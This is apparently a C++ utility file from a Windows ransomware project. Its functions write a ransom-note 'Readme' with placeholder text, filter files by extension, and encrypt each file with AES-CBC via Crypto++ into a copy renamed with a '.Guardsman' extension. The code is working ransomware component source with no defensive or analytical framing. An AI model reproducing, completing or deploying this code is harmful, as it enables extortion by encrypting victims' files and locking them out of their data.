#include "Utils.h"

VOID Utils::Readme(String path) 
{
    HANDLE hFile = CreateFile(
        path.c_str(),
        GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL);

    if (hFile != INVALID_HANDLE_VALUE)
    {
        std::vector<String> message
        {
            _T("Your text.\n"),
            _T("bla bla bla.\n")
        };

        for (const auto& msg : message)
        {
            DWORD dwBytesToWrite{ (DWORD)_tcslen(msg.c_str()) * sizeof(TCHAR) };
            DWORD dwBytesWritten{ 0 };

            WriteFile(
                hFile,
                msg.c_str(),
                dwBytesToWrite,
                &dwBytesWritten,
                NULL);
        }

        CloseHandle(hFile);
    }
}

BOOL Utils::DirectoryExists(String dir)
{
    DWORD dwAttrib{ GetFileAttributes(dir.c_str()) };

    return (dwAttrib != INVALID_FILE_ATTRIBUTES &&
           (dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
}

String Utils::UserName()
{
    TCHAR dataBuffer[UNLEN + 1];
    DWORD dwSize{ UNLEN + 1 };

    GetUserName(dataBuffer, &dwSize);
    return String(dataBuffer);
}

String Utils::GetFileExt(String file)
{
    return file.substr(file.find_last_of(_T(".")) + 1);
}

BOOL Utils::Contains(const std::vector<String>& v, String ext)
{
    if (std::find(v.begin(), v.end(), ext) != v.end())
        return TRUE;
    else
        return FALSE;
}

VOID Utils::Encrypt(CryptoPP::SecByteBlock key, CryptoPP::SecByteBlock iv, String file)
{
    std::ifstream in(file, std::ios::binary);
    std::ofstream out(file + _T(".Guardsman"), std::ios::binary);

    CryptoPP::CBC_Mode<CryptoPP::AES>::Encryption cipher;
    cipher.SetKeyWithIV(key, key.size(), iv);

    CryptoPP::FileSource f(in, true,
        new CryptoPP::StreamTransformationFilter(cipher,
            new CryptoPP::FileSink(out)));
}